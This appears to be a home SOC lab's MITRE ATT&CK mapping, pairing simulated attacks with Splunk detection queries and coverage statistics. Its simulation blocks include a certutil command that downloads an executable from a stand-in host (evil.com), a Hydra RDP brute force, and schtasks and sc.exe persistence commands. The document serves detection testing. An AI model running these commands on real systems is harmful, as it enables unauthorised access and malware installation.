# MITRE ATT&CK Mapping

## Overview

This document maps all simulated attacks in the Home SOC Lab to the MITRE ATT&CK framework, providing a comprehensive view of adversary tactics and techniques.

## ATT&CK Matrix Coverage

### Tactic: Reconnaissance

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1595 | Active Scanning | Nmap port scan | ✅ Detected |

### Tactic: Initial Access

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1190 | Exploit Public-Facing Application | Not simulated | ⚠️ Future enhancement |
| T1133 | External Remote Services | Brute force RDP | ✅ Detected |

### Tactic: Execution

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1059.001 | PowerShell | Encoded commands | ✅ Detected |
| T1059.003 | Windows Command Shell | cmd.exe execution | ✅ Detected |
| T1218 | System Binary Proxy Execution | LOLBAS (certutil, mshta) | ✅ Detected |

### Tactic: Persistence

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1053.005 | Scheduled Task | schtasks creation | ✅ Detected |
| T1543.003 | Windows Service | sc.exe create | ✅ Detected |

### Tactic: Privilege Escalation

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1068 | Exploitation for Privilege Escalation | Not simulated | ⚠️ Future enhancement |

### Tactic: Defense Evasion

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1027 | Obfuscated Files or Information | Base64 encoding | ✅ Detected |
| T1218 | System Binary Proxy Execution | LOLBAS usage | ✅ Detected |

### Tactic: Credential Access

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1110 | Brute Force | Hydra RDP attack | ✅ Detected |
| T1003.001 | LSASS Memory | Process access attempt | ✅ Detected |

### Tactic: Discovery

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1046 | Network Service Discovery | Nmap scanning | ✅ Detected |
| T1082 | System Information Discovery | Systeminfo commands | ✅ Detected |
| T1057 | Process Discovery | Get-Process | ✅ Detected |

### Tactic: Lateral Movement

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1021.001 | Remote Desktop Protocol | RDP brute force | ✅ Detected |
| T1021.002 | SMB/Windows Admin Shares | SMB connection attempts | ⚠️ Partial |

### Tactic: Collection

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1005 | Data from Local System | Not simulated | ⚠️ Future enhancement |

### Tactic: Command and Control

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1071.001 | Web Protocols | Not simulated | ⚠️ Future enhancement |
| T1571 | Non-Standard Port | Reverse shell on 4444 | ✅ Detected |

### Tactic: Exfiltration

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1041 | Exfiltration Over C2 Channel | Not simulated | ⚠️ Future enhancement |

### Tactic: Impact

| Technique ID | Technique Name | Simulation | Detection Status |
|--------------|----------------|------------|------------------|
| T1486 | Data Encrypted for Impact | Not simulated | ⚠️ Future enhancement |

---

## Detailed Technique Mapping

### T1110 - Brute Force

**Sub-techniques:**
- T1110.001 - Password Guessing
- T1110.003 - Password Spraying

**Simulation:**
```bash
hydra -l victim -P passwords.txt rdp://192.168.56.20
```

**Detection:**
```spl
index=windows_events EventCode=4625
| stats count by IpAddress, TargetUserName
| where count >= 5
```

**MITRE Reference:** https://attack.mitre.org/techniques/T1110/

---

### T1046 - Network Service Discovery

**Simulation:**
```bash
nmap -sS -sV 192.168.56.20
```

**Detection:**
```spl
index=sysmon_events EventCode=3
| stats dc(DestinationPort) as unique_ports by SourceIp
| where unique_ports >= 15
```

**MITRE Reference:** https://attack.mitre.org/techniques/T1046/

---

### T1059.001 - PowerShell

**Simulation:**
```powershell
powershell.exe -EncodedCommand "SQBFAFgAIAAoAE4A..."
```

**Detection:**
```spl
index=sysmon_events EventCode=1
| search CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*"
```

**MITRE Reference:** https://attack.mitre.org/techniques/T1059/001/

---

### T1218 - System Binary Proxy Execution

**Sub-techniques:**
- T1218.003 - CMSTP
- T1218.005 - Mshta
- T1218.010 - Regsvr32
- T1218.011 - Rundll32

**Simulation:**
```cmd
certutil.exe -urlcache -f http://evil.com/mal.exe mal.exe
mshta.exe javascript:close()
```

**Detection:**
```spl
index=sysmon_events EventCode=1
| search (Image="*certutil*" AND CommandLine="*urlcache*")
  OR (Image="*mshta*")
```

**MITRE Reference:** https://attack.mitre.org/techniques/T1218/

---

### T1053.005 - Scheduled Task

**Simulation:**
```cmd
schtasks.exe /create /tn "MaliciousTask" /tr "malware.exe" /sc onlogon
```

**Detection:**
```spl
index=sysmon_events EventCode=1
| search Image="*schtasks*" CommandLine="*/create*"
```

**MITRE Reference:** https://attack.mitre.org/techniques/T1053/005/

---

### T1543.003 - Windows Service

**Simulation:**
```cmd
sc.exe create MaliciousService binPath="C:\malware.exe" start= auto
```

**Detection:**
```spl
index=sysmon_events EventCode=1
| search (Image="*sc.exe*" AND CommandLine="*create*")
```

**MITRE Reference:** https://attack.mitre.org/techniques/T1543/003/

---

### T1055 - Process Injection

**Sub-techniques:**
- T1055.001 - Dynamic-link Library Injection
- T1055.002 - Portable Executable Injection

**Simulation:**
```powershell
# Process access to LSASS (credential dumping)
Get-Process lsass | Select-Object Id
```

**Detection:**
```spl
index=sysmon_events EventCode=10 TargetImage="*lsass.exe"
| stats count by SourceImage, User
```

**MITRE Reference:** https://attack.mitre.org/techniques/T1055/

---

## ATT&CK Navigator Layer

Export this to ATT&CK Navigator for visualization:

```json
{
  "name": "Home SOC Lab Coverage",
  "version": "3.0",
  "domain": "mitre-enterprise",
  "description": "Detection coverage for Home SOC Lab",
  "techniques": [
    {
      "techniqueID": "T1110",
      "score": 100,
      "color": "#00ff00",
      "comment": "Brute force detected via EventCode 4625"
    },
    {
      "techniqueID": "T1046",
      "score": 100,
      "color": "#00ff00",
      "comment": "Port scan detected via Sysmon EventCode 3"
    },
    {
      "techniqueID": "T1059.001",
      "score": 100,
      "color": "#00ff00",
      "comment": "PowerShell execution detected"
    },
    {
      "techniqueID": "T1218",
      "score": 100,
      "color": "#00ff00",
      "comment": "LOLBAS detected (certutil, mshta, etc.)"
    },
    {
      "techniqueID": "T1053.005",
      "score": 100,
      "color": "#00ff00",
      "comment": "Scheduled task creation detected"
    },
    {
      "techniqueID": "T1543.003",
      "score": 100,
      "color": "#00ff00",
      "comment": "Service creation detected"
    },
    {
      "techniqueID": "T1055",
      "score": 75,
      "color": "#ffff00",
      "comment": "Process injection partially detected"
    }
  ]
}
```

---

## Coverage Statistics

### By Tactic

| Tactic | Techniques | Covered | Coverage % |
|--------|------------|---------|------------|
| Reconnaissance | 1 | 1 | 100% |
| Initial Access | 2 | 1 | 50% |
| Execution | 3 | 3 | 100% |
| Persistence | 2 | 2 | 100% |
| Defense Evasion | 2 | 2 | 100% |
| Credential Access | 2 | 2 | 100% |
| Discovery | 3 | 3 | 100% |
| Lateral Movement | 2 | 1 | 50% |
| Command and Control | 2 | 1 | 50% |
| **Total** | **19** | **16** | **84%** |

### By Severity

| Severity | Count | Percentage |
|----------|-------|------------|
| Critical | 3 | 19% |
| High | 8 | 50% |
| Medium | 4 | 25% |
| Low | 1 | 6% |

---

## Detection Gaps

### Techniques Not Covered

1. **T1566 - Phishing**
   - Requires email infrastructure
   - Future: Add phishing simulation

2. **T1078 - Valid Accounts**
   - Hard to detect without baseline
   - Future: Implement user behavior analytics

3. **T1071 - Application Layer Protocol**
   - Requires network packet inspection
   - Future: Add Zeek/Suricata integration

4. **T1486 - Data Encrypted for Impact**
   - Ransomware simulation
   - Future: Add safe ransomware test files

---

## Improving Coverage

### Short-term (1-3 months)

1. Add lateral movement simulations (PsExec, WMI)
2. Implement DCSync detection
3. Add Kerberoasting detection
4. Create persistence mechanism detections

### Medium-term (3-6 months)

1. Integrate threat intelligence feeds
2. Add machine learning anomaly detection
3. Implement Sigma rules
4. Create custom threat hunting queries

### Long-term (6+ months)

1. Deploy additional SIEM (ELK, Wazuh)
2. Add network monitoring (Zeek, Suricata)
3. Implement SOAR for automated response
4. Create red team vs blue team exercises

---

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [MITRE ATT&CK for Enterprise](https://attack.mitre.org/matrices/enterprise/)
- [CAR - Cyber Analytics Repository](https://car.mitre.org/)

---

## Changelog

| Date | Version | Author | Changes |
|------|---------|--------|---------|
| 2024-01-10 | 1.0 | SOC Team | Initial mapping |
| 2024-02-20 | 1.1 | SOC Team | Added coverage statistics |
| 2024-03-15 | 1.2 | SOC Team | Added ATT&CK Navigator export |
